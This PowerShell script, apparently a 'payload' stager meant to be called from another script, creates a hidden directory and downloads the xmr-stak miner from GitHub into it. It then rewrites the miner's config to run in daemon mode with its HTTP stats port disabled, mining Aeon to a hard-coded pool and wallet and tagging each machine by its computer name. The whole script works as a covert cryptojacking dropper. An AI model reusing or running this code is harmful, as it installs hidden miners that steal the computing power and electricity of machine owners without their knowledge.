# Unified Advance Party Script - Functions included until I find an elegant way to send 
# separate files for the functions in the AP setup process

# Accept a paramter for the operations directory which is stored in the JSON config

param(
	[Parameter(Mandatory=$True,
	ValueFromPipeline=$True)]
	[string]$opsDirectory
)

# Advance Party functions

function payload ($destination) { 

	# Get xmr-stak from github.
		
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.4.2/xmr-stak-win64.zip -OutFile $destination
	
	}
	
function configTpl () {
	
	 # Get config template from github
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-RestMethod -Uri https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/config.tpl
	
	}
	
function poolTpl () {
	
	# Get pool template from github
	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	Invoke-RestMethod -Uri https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/pools.tpl
	
	}
	
function stripExcess ($template) {
	
	# strip out unneeded characters from the configuration templates
	$head = 'R"===('
	$tail = ')==="'
	
	$template = $template.replace($head, "")
	$template = $template.replace($tail, "")
	
	$template.Replace("`n","`r`n")
	
	
	}
	
function alterConfigTpl ($file) {
	
	# alter the downloaded config template and set configuration
	(Get-Content "$file") | ForEach-Object { $_ -replace '"verbose_level" : 3,','"verbose_level" : 4,' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace '"print_motd" : true,','"print_motd" : false,' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace '"h_print_time" : 60,','"h_print_time" : 300,' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace '"daemon_mode" : false,','"daemon_mode" : true,' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace '"flush_stdout" : false,','"flush_stdout" : true,' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace '"httpd_port" : HTTP_PORT,','"httpd_port" : 0,' } | Set-Content "$file"
	
	}
	
function alterPoolTpl ($file) {
	
	#alter the pool downloaded pool template and set configuration
	
	(Get-Content "$file") | ForEach-Object { $_ -replace '"currency" : "CURRENCY"','"currency" : "aeon7"' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace "POOLCONF",'{"pool_address" : "pool.aeonminingpool.com:3335", "wallet_address" : "Wmt1MRyhVkffvWShqLBbytMWfdkRhzago6wHn61cgnMEMDEm5HNMsdmBycerj5iJVFjkEDAFcaVDiUxUEea6EvTJ1fhpkFnQc", "rig_id" : "", "pool_password" : "COMPUTERNAME", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },
	' } | Set-Content "$file"
	(Get-Content "$file") | ForEach-Object { $_ -replace "COMPUTERNAME" ,"$env:COMPUTERNAME" } | Set-Content "$file"
	
	}

# END FUNCTIONS

# BEGIN PARTYING!

# Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1

if (!(Test-Path $opsDirectory))
{
    mkdir $opsDirectory
	$f = Get-Item $opsDirectory -Force
	$f.Attributes = "Hidden"
}

# Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.

$payloadDestination = "$opsDirectory\payload.zip"

if (!(Test-Path "$opsDirectory\xmr-stak-win64")) 

{

payload $payloadDestination
Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDirectory
Remove-Item $payloadDestination

}


# Load the newly unzipped directory path into a variable and set the destiation path to extract the config.

$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
$stakDir = "$opsDirectory\$unzipDir"

# Check to see if a config.txt file exists - download the template and modify as needed if it doesn't

if (!(Test-Path "$stakDir\config.txt"))

{

	stripExcess (configTpl) | Out-File "$stakDir\config.txt"
	alterConfigTpl "$stakDir\config.txt"

}

# Check for a pools.txt file - download the template and modify as needed if it doesn't

if (!(Test-Path "$stakDir\pools.txt"))

{
	
	stripExcess (poolTpl) | Out-File "$stakDir\pools.txt"
	alterPoolTpl "$stakDir\pools.txt"

}

